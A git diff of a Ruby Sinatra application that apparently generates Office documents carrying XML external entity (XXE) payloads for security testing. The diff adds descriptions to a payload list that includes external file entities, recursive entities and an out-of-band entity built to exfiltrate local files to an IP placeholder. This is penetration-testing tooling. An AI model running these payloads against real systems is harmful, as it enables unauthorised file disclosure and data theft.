@@ -20,11 +20,7 @@ if not File.file?('./db/master.db')
 end
 
 # TODO apply to all xml in docx
-# TODO http://stackoverflow.com/questions/34746900/sparkjava-upload-file-didt-work-in-spark-java-framework
-# TODO add help about payloads (modal button on abll payload type screens)
-# TODO add help about uploading your own documents
-# TODO add payload descriptions
-# TODO have file descriptions show XML payload
+# TODO OOB is incorrect
 
 set :options, JSON.parse(File.read('./options.json'))
 set :protocols, ["http","https","ftp","jar","file","netdoc","mailto","gopher","none"]
@@ -34,14 +30,14 @@ set :poc_types, ["pdf","jpg","gif"]
 # Keep the payloads organized
 def read_payloads()
 	pl = {}
-	pl[ "Remote DTD public check"] = ['<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/EXF">']
-	pl["Canary XML Entity"] = ['<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>']
-	pl["External XML Entity"] = ['<!DOCTYPE root [<!ENTITY xxe SYSTEM "FILE">]>']
-	pl["Recursive XML Entity"] = ['<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>']
-	pl["Plain Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>']
-	pl["Recursive Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>']
-	pl["Parameter Entity Connectback"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "IP/EXF">%a;]>']
-	pl["Out of Bounds Attack"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "IP/EXF">%a;]>']
+	pl[ "Remote DTD public check"] = ['<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/FILE">',"A Remote DTD causes the XML parser to make an external connection when successful. "]
+	pl["Canary XML Entity"] = ['<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>', "The Canary XML Entity is useful to check if the application rejects a file with an entity included. No malicious application but useful to check for."]
+	pl["Plain External XML Entity"] = ['<!DOCTYPE root [<!ENTITY xxe SYSTEM "FILE">]>', "A simple external XML entity. Note, the file is the value for the payload; IP and PROTOCOL are ignored by OXML XXE."]
+	pl["Recursive XML Entity"] = ['<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>', "A recursive XML Entity. This is a precursor check to the billion laughs attack."]
+	pl["Canary Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>', "A parameter entity check. This is valuable because the entity is checked immediately when the DOCTYPE is parsed. No malicious application but useful to check for."]
+	pl["Plain External Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "FILE"> %a;]>', "A simple external parameter entity. Note, the file is the value for the payload; IP and PROTOCOL are ignored by OXML XXE. Useful because the entity is checked immediately when the DOCTYPE is parsed. "]
+	pl["Recursive Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>',"Technically recursive parameter entities are not allowed by the XML spec. Should never work. Precursor to the billion laughs attack."]
+	pl["Out of Bounds Attack"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "IP/FILE">%a;]>',"OOB is a useful technique to exfiltrate files when attacking blind."]
 	return pl
 end
 
@@ -178,7 +174,6 @@ post '/xss' do
 
 	# TODO logic check if svg or xml
 	# TODO modify uri
-	# TODO sanitize double quote
 	# TODO add a supported types box
 	# TODO add a non-entity replacement option
 
@@ -282,6 +277,7 @@ get '/view_file' do
 	haml :display_file, :encode_html => true
 end
 
+# TODO delete from FS
 get '/delete' do
 	file = Oxfile.first(:id => params["id"])
 	file.destroy if file
@@ -289,5 +285,6 @@ get '/delete' do
 end
 
 get '/help' do
+	@payloads = read_payloads()
 	haml :help
 end
